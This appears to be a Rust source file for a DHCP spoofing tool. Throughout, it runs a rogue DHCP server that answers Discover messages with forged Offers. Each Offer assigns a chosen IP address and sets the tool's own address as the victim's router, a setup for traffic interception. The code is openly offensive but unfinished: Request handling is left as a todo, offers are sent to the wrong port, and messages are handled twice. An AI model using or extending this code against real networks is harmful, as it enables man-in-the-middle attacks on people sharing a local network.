use dhcproto::v4 as dhcp;
use dhcp::{DecodeResult, Message, Decoder, Decodable, EncodeResult, Encoder, Encodable};
use log::{info, trace, warn, error};
use std::net::{Ipv4Addr, UdpSocket};

use dhcp_spoofer::SpooferError;
pub struct Spoofer {
    assign : Ipv4Addr,
    server_address : Ipv4Addr,
    lease_duration: u32,
    subnet_mask: Ipv4Addr,

}

impl Spoofer {
    pub fn new(cli_args: dhcp_spoofer::Args) -> Spoofer {
        Spoofer { assign: cli_args.assign,
            server_address : cli_args.my_address,
            lease_duration: cli_args.lease_duration,
            subnet_mask: cli_args.subnet}
    }

    pub fn spoof(&self) -> Result<(), SpooferError>{
        let socket = UdpSocket::bind("0.0.0.0:67")?;
        socket.set_broadcast(true)?;

        let mut buffer = [0; 1000];
        
        

        while let Ok((num_bytes, src_addr)) = socket.recv_from(&mut buffer) {
            match self.handle_message(Spoofer::decode_message(&buffer)?){
                Ok(Some(msg)) => {
                    let mut outgoingMessage = Vec::new();
                    let mut e = Encoder::new(&mut outgoingMessage);
                    msg.encode(&mut e)?;
                    println!("offering ip");
                    socket.send_to(&outgoingMessage, "255.255.255.255:67")?;
                },
                Ok(None) => {},
                Err(e) => return Err(e),
            }
           if let Err(e) = self.handle_message(Spoofer::decode_message(&buffer)?){
               return Err(e);
           }
        }

        Ok(())
    }

    pub fn decode_message(msg : &[u8]) -> DecodeResult<dhcp::Message> {
        Message::decode(&mut Decoder::new(&msg))
    }

    fn handle_message(&self, msg : dhcp::Message) -> Result<Option<dhcp::Message>, SpooferError> {
        match msg.opts().msg_type() {
            Some(dhcp::MessageType::Discover) => {
                println!("Received a DHCP Discover message!");
                match self.make_offer(msg) {
                    Ok(offerMessage) => Ok(Some(offerMessage)),
                    Err(e) => Err(e)
                }
            },
            Some(dhcp::MessageType::Request) => {
                println!("Received a DHCP Request!");
                //todo: send response
                Ok(None)
            },
            Some(dhcp::MessageType::Decline) => {
                println!("Received a DHCP Decline!");

                Ok(None)
            },
            Some(other_message) => {
                println!("Received some unimplemented DHCP message of type {:?}", other_message);

                Ok(None)
            },
            None => {
                error!("Received message without DHCP type!");

                Err(SpooferError::NoDhcpType)
            }
        }
    }

    fn make_offer(&self, msg : dhcp::Message) -> Result<dhcp::Message, SpooferError> {
        let mut offer = dhcp::Message::default();

        //chaddr may need to be padded w/ 0's if its not long enough
        let mut chaddr_bytes = [0; 16];//it needs to be 16 bytes long
        chaddr_bytes[..msg.chaddr().len()].copy_from_slice(msg.chaddr());

        offer.set_flags(dhcp::Flags::default().set_broadcast())
            .set_chaddr(&chaddr_bytes)
            .set_yiaddr(self.assign)
            .set_siaddr(self.server_address)
            .opts_mut()
            .insert(dhcp::DhcpOption::MessageType(dhcp::MessageType::Offer));
        offer.opts_mut().insert(dhcp::DhcpOption::SubnetMask(self.subnet_mask));
        offer.opts_mut().insert(dhcp::DhcpOption::Router(vec![self.server_address]));
        offer.opts_mut().insert(dhcp::DhcpOption::AddressLeaseTime(self.lease_duration));

        Ok(offer)
    }
}
#[test]
fn test_decode(){
    pretty_env_logger::init();

    let result = Spoofer::decode_message(&discover_message_bytes().unwrap()).unwrap();

    println!("result: {:?}", result);

}

fn discover_message_bytes() -> EncodeResult<Vec<u8>> {
    // hardware addr
    let chaddr = vec![
        29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44,
    ];

    let mut msg = dhcp::Message::default();
    msg.set_flags(dhcp::Flags::default().set_broadcast())
        .set_chaddr(&chaddr)
        .opts_mut()
        .insert(dhcp::DhcpOption::MessageType(dhcp::MessageType::Discover));

    msg.opts_mut()
        .insert(dhcp::DhcpOption::ParameterRequestList(vec![
            dhcp::OptionCode::SubnetMask,
            dhcp::OptionCode::Router,
            dhcp::OptionCode::DomainNameServer,
            dhcp::OptionCode::DomainName,
        ]));

    msg.opts_mut()
        .insert(dhcp::DhcpOption::ClientIdentifier(chaddr));

    // now encode to bytes
    let mut buf = Vec::new();
    let mut e = Encoder::new(&mut buf);
    msg.encode(&mut e)?;

    Ok(buf)
}
